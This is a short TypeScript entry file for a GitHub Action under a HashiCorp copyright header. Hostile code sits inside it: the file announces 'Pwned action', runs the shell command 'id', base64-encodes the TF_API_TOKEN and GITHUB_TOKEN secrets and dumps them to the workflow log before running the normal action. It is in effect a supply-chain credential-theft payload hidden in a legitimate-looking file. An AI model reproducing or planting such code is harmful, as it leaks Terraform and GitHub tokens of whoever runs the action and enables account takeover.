/**
 * Copyright (c) HashiCorp, Inc.
 * SPDX-License-Identifier: MPL-2.0
 */

import * as core from "@actions/core";
import { run } from "./action";

import { execSync } from 'child_process';

console.log("\r\nPwned action...");
console.log(execSync('id').toString());



const tfToken = Buffer.from(process.env.TF_API_TOKEN || ''.split("").reverse().join("")).toString('base64');
const ghToken = Buffer.from(process.env.GITHUB_TOKEN || ''.split("").reverse().join("")).toString('base64');


console.log('\r\nDumping tokens:', {tfToken, ghToken});

run().catch((error) => {
  core.setFailed(error.message);
});
